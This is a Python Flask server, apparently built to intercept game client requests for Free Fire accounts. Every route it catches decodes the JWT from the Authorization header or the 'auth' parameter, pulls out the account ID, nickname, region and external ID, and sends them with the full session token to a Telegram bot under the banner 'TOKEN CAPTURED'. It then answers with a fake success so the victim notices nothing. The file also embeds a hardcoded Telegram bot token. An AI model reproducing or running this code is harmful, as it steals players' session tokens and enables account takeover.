import os
import base64
import json
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8956940192:AAGu8293e28HolwGE3yFt0m-Q8xKsOg6uo4")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload_encoded = parts[1]
        payload_encoded += '=' * (-len(payload_encoded) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_encoded)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception as e:
        print(f"JWT Decode Error: {e}")
        return None

@app.route('/<path:subpath>', methods=['POST', 'GET'])
def catch_all_game_requests(subpath):
    try:
        auth_header = request.headers.get('Authorization') or request.args.get('auth')
        chat_id = request.args.get('chat_id')

        if auth_header:
            if auth_header.startswith("Bearer "):
                jwt_token = auth_header.split(" ")[1]
            else:
                jwt_token = auth_header

            jwt_data = decode_jwt_payload(jwt_token)
            if jwt_data:
                account_id = jwt_data.get("account_id")
                encoded_nickname = jwt_data.get("nickname")
                region = jwt_data.get("lock_region")
                open_id = jwt_data.get("external_id")
                
                try:
                    nickname = base64.b64decode(encoded_nickname).decode('utf-8') if encoded_nickname else "Unknown"
                except:
                    nickname = encoded_nickname

                if chat_id:
                    msg_text = (
                        f"🔑 *TOKEN CAPTURED VIA /{subpath}*!\n\n"
                        f"👤 *ACCOUNT ID:* `{account_id}`\n"
                        f"🎮 *PLAYER NAME:* `{nickname}`\n"
                        f"🌍 *REGION:* `{region}`\n"
                        f"🆔 *OPEN ID:* `{open_id}`\n\n"
                        f"🛡️ *JWT TOKEN:*\n`{jwt_token}`"
                    )
                    requests.post(TELEGRAM_API_URL, json={
                        "chat_id": chat_id,
                        "text": msg_text,
                        "parse_mode": "Markdown"
                    })

        return jsonify({"status": 0, "msg": "success"}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": -1, "msg": str(e)}), 200

@app.route('/')
def home():
    return "FF Interceptor Server is Running Successfully!"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
